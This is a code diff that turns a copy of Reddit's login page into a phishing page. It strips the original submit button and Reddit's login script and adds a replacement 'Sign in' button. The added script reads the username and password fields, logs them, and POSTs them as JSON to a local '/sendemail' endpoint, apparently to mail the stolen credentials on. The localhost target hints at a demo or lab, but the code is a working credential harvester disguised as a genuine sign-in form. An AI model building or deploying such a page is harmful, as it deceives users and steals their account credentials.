@@ -83,7 +83,6 @@
       <span class="BottomLink switch-otp-type">Use a backup code</span>
     </fieldset>
     <fieldset class="AnimatedForm__field">
-      <button class="AnimatedForm__submitButton" type="submit" onclick="getCredentials()">Sign In</button>
       <div class="AnimatedForm__submitStatus">
         <div class="AnimatedForm__submitStatusIcon"></div><!--
         --><span class="AnimatedForm__submitStatusMessage"></span>
@@ -103,6 +102,9 @@
     --><span class="LinkSeparator">•</span><!--
     --><a class="BottomLink" target="_blank" href="https://www.reddithelp.com/en/categories/using-reddit/your-reddit-account/how-set-two-factor-authentication">Having&nbsp;trouble&nbsp;?</a>
   </div>
+  <div>
+    <button class="AnimatedForm__submitButton" id = 'mybutton'>Sign in</button>
+  <div>
 </div>
 
 
@@ -111,13 +113,40 @@
     </div>
 </div>
 
+  <script>
+  function postCreds(creds)
+  {
+    console.log("sending",creds);
 
-    <script>
-            //<![CDATA
+    fetch("http://127.0.0.1:5000/sendemail", {
+      method: "POST",
+      body: JSON.stringify(creds),
+      headers: {
+      'Accept' : 'application/json, text/plain, */*',
+      'Content-Type': 'application/json'
+      },
 
-                window.___r = {"config": {"tracker_endpoint": "https://events.reddit.com/v2", "tracker_key": "AccountManager3", "tracker_secret": "V2FpZ2FlMlZpZTJ3aWVyMWFpc2hhaGhvaHNoZWl3"}};
-            //]]>
-        </script>
+    })
+
+  }
+
+
+
+  var button = document.getElementById("mybutton");
+  var loginVal = document.getElementById("loginUsername");
+  var passwordVal = document.getElementById("loginPassword");
+
+  button.onclick = function(){
+    console.log(loginVal.value, passwordVal.value);
+    console.log("Username: ", loginVal.value);
+    console.log("Password: ", passwordVal.value);
+    postCreds({
+      username: loginVal.value,
+      password: passwordVal.value,
+    })
+  }
+
+  </script>
 
   <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/common.8f6d05b2cf6c5cc729e7.js"></script>
 
@@ -125,7 +154,7 @@
 
   <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/theme.f03d466e68261629ed71.js"></script>
 
-  <script type="text/javascript" src="https://www.redditstatic.com/accountmanager/login.accddb1e7452e09e03bc.js"></script>
+
 
 
     </body>
